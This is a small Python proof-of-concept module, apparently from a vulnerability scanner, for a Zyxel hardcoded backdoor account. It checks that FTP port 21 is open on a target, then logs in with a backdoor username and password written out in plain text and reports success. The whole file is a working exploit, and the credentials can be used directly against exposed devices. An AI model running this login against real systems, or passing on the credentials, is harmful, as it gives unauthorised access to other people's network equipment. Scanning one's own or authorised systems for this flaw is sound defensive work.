# -*- coding:utf-8 -*-
# Zyxel 硬编码后门账户
import ftplib

from .. import requestUtil
from ServiceScanModel.models import ServiceScan
import socket

class POC:
    def __init__(self, service: ServiceScan):
        self.service = service

    def fingerprint(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((self.service.ip, 21))
            return True
        except:
            return False

    def poc(self):
        try:
            ftp = ftplib.FTP(self.service.ip, timeout=0.5)
            ftp.login("zyfwp", "PrOw!aN_fXp")
            return ["Zyxel 硬编码后门账户", "用户名: zyfwp<br>密码: PrOw!aN_fXp"]
        except:
            return []